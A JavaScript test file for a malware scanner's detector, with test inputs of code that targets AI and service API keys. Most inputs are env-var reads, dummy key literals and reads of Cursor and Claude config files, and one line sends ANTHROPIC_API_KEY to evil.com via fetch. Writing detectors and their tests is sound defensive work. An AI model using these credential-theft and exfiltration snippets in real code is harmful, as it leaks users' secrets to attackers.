import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-ai-token-targeting.js';

test('D22: ANTHROPIC_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.ANTHROPIC_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'claude_token_targeting'));
});

test('D22: OPENAI_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.OPENAI_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'openai_token_targeting'));
});

test('D22: GEMINI_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.GEMINI_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'gemini_token_targeting'));
});

test('D22: MISTRAL_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.MISTRAL_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'mistral_token_targeting'));
});

test('D22: CURSOR_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.CURSOR_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'cursor_token_targeting'));
});

test('D22: OpenRouter key literal detected', async () => {
  const files = [{ path: 'i.js', content: 'const k = "sk-or-v1-0123456789abcdefghij"' }];
  const findings = await scan({}, [], null, files);
  assert.ok(findings[0].detail?.some((d) => d.type === 'openrouter_token_targeting'));
});

test('D22: Slack token literal detected', async () => {
  const files = [{ path: 'i.js', content: 'const t = "xoxb-1234567890abcdef"' }];
  const findings = await scan({}, [], null, files);
  assert.ok(findings[0].detail?.some((d) => d.type === 'slack_token_targeting'));
});

test('D22: SendGrid key literal detected', async () => {
  const files = [
    {
      path: 'i.js',
      content: 'const k = "SG.abcdefghijklmnopqrstuv.xwyz0123456789abcdefghijklmnopqrstuvx"',
    },
  ];
  const findings = await scan({}, [], null, files);
  assert.ok(findings[0].detail?.some((d) => d.type === 'sendgrid_token_targeting'));
});

test('D22: Google API key literal detected', async () => {
  const files = [{ path: 'i.js', content: 'const k = "AIzaSyD-abcdefghijklmnopqrstuvwxyz12345"' }];
  const findings = await scan({}, [], null, files);
  assert.ok(findings[0].detail?.some((d) => d.type === 'google_api_key_targeting'));
});

test('D22: ~/.cursor/settings.json targeting detected', async () => {
  const files = [{ path: 'steal.js', content: "readFileSync(expand('~/.cursor/settings.json'))" }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'cursor_token_targeting'));
});

test('D22: ~/.claude/mcp.json config targeting detected', async () => {
  const files = [{ path: 'steal.js', content: "readFileSync(expand('~/.claude/mcp.json'))" }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'ai_config_targeting'));
});

test('D22: AI token + fetch exfiltration returns BLOCK', async () => {
  const files = [
    {
      path: 'exfil.js',
      content:
        'const key = process.env.ANTHROPIC_API_KEY; fetch("https://evil.com/steal?key=" + key)',
    },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].recommendation?.startsWith('BLOCK'));
  assert.ok(findings[0].detail?.some((d) => d.type === 'ai_token_exfiltration'));
});

test('D22: legitimate AI app producing no findings', async () => {
  const files = [
    {
      path: 'app.js',
      content:
        'const response = await client.messages.create({ model: "claude-3", max_tokens: 1024 });',
    },
  ];
  const findings = await scan({}, [], null, files);
  assert.equal(findings.length, 0);
});

test('D22: empty package returns no findings', async () => {
  const findings = await scan({}, [], null, []);
  assert.equal(findings.length, 0);
});

test('D22: no files returns no findings', async () => {
  const findings = await scan({}, [], null, null);
  assert.equal(findings.length, 0);
});
